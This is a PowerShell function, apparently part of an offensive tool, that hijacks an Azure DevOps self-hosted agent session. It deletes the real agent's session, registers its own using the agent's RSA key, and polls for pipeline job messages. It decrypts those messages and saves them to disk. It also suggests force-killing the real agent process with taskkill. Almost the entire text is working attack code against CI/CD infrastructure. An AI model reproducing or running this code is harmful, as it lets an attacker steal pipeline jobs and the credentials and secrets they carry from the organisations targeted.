# ── Self-Hosted Session Hijack ──────────────────────────
# Exclusive access: find session -> delete -> create ours -> poll
function Invoke-SessionHijack {
    param(
        [hashtable]$AgentInfo,
        [hashtable]$Auth
    )

    Write-Host ""
    Write-Log "SELF-HOSTED MODE: Session hijack" -Severity Info

    # ── Session hijack ──
    $existingSession = Find-SessionId -AgentPath $AgentInfo.AgentPath
    $maxRetries = 20
    $sessionId  = $null
    $aesKey     = $null

    for ($i = 1; $i -le $maxRetries; $i++) {
        if ($existingSession) {
            Write-Log "Attempt $i - deleting session $existingSession" -Severity Warning
            Remove-Session -ServerUrl $AgentInfo.ServerUrl -PoolId $AgentInfo.PoolId `
                -SessionId $existingSession -ApiHeaders $Auth.ApiHeaders
        }

        $result = New-AgentSession -AgentInfo $AgentInfo -ApiHeaders $Auth.ApiHeaders -Rsa $AgentInfo.Rsa
        if ($result.SessionId) {
            $sessionId = $result.SessionId
            $aesKey    = $result.AesKey
            Write-Log "Session hijacked: $sessionId" -Severity Success
            Write-Detail "AES key: $($aesKey.Length) bytes"
            break
        }

        if ($result.IsConflict) {
            Write-Log "Conflict - real agent recreated session, retrying..." -Severity Warning
        } else {
            Write-Log "Error: $($result.Error)" -Severity Warning
        }
        Start-Sleep -Seconds 1
    }

    if (-not $sessionId) {
        Write-Log "Failed to hijack session after $maxRetries attempts" -Severity Error
        Write-Detail "Kill the real agent: taskkill /IM Agent.Listener.exe /F" "Yellow"
        exit 1
    }

    # ── Poll for job ──
    # Accept first encrypted message -- no filtering, no deletion, no stale check
    $messagesUrl = "$($AgentInfo.ServerUrl)/_apis/distributedtask/pools/$($AgentInfo.PoolId)/messages?sessionId=$sessionId&api-version=7.0"

    Write-Host ""
    Write-Log "Listening for job messages..." -Severity Info
    Write-Log "Trigger a pipeline now to receive a job" -Severity Warning
    Write-Host ""

    $jobJson = $null
    while (-not $jobJson) {
        try {
            $response = Invoke-RestMethod -Uri $messagesUrl -Headers $Auth.ApiHeaders -Method GET -TimeoutSec 5
            if ($response -and $response.body) {
                Write-Host ""
                Write-Log "Encrypted message received!" -Severity Success
                $jobJson = Decrypt-JobMessage $response $aesKey
                Write-Log "Decrypted job message: $($jobJson.Length) chars" -Severity Success
            }
        } catch {
            Write-Host "." -NoNewline
        }
        if (-not $jobJson) { Start-Sleep -Seconds 1 }
    }

    # Save job to run folder
    if ($script:RunDir) {
        $msgPath = Join-Path $script:RunDir "message.json"
        try {
            $msgObj = $jobJson | ConvertFrom-Json
            $pretty = $msgObj | ConvertTo-Json -Depth 20
            [IO.File]::WriteAllText($msgPath, $pretty)
        } catch {
            [IO.File]::WriteAllText($msgPath, $jobJson)
        }
        Write-Log "Saved message.json" -Severity Info
    }

    return @{
        SessionId = $sessionId
        AesKey    = $aesKey
        JobJson   = $jobJson
    }
}
